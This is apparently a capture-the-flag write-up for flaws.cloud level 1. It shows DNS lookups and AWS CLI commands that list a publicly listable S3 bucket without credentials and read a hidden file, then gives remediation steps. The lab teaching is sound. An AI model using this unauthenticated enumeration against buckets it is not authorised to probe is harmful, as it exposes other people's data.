flaws.cloud — Level 1 Writeup
Vulnerability

S3 Bucket Public Listing Misconfiguration

Overview

The S3 bucket hosting flaws.cloud was configured with a public LIST policy, allowing any unauthenticated user to enumerate all objects inside the bucket without any AWS credentials.

Steps to Reproduce

1. Identify S3 hosting via DNS

bash
nslookup $(dig +short flaws.cloud | head -1)

Output confirmed the domain resolves to s3-website-us-west-2.amazonaws.com, meaning the bucket name equals the domain: flaws.cloud.

2. Enumerate bucket contents without credentials

bash
aws s3 ls s3://flaws.cloud --no-sign-request

--no-sign-request sends the request with no AWS identity attached, simulating an unauthenticated attacker.

Output:

2017-03-14 08:00:38       2575 hint1.html
2017-03-03 09:05:17       1707 hint2.html
2017-03-03 09:05:11       1101 hint3.html
2024-02-22 07:32:41       2861 index.html
2018-07-10 21:47:16      15979 logo.png
2017-02-27 06:59:28         46 robots.txt
2017-02-27 06:59:30       1051 secret-dd02c7c.html

3. Read the secret file

bash
aws s3 cp s3://flaws.cloud/secret-dd02c7c.html - --no-sign-request

The - streams file content to stdout instead of saving to disk. The file contained a link to Level 2.

Impact

An attacker can enumerate all files in a misconfigured bucket without any credentials. Even if files themselves are not publicly readable, knowing filenames (backups, configs, internal tools) gives an attacker a roadmap for further exploitation.

Remediation
Set bucket ACL to private
Disable public access in S3 Block Public Access settings
Apply a bucket policy explicitly denying s3:ListBucket to Principal: *
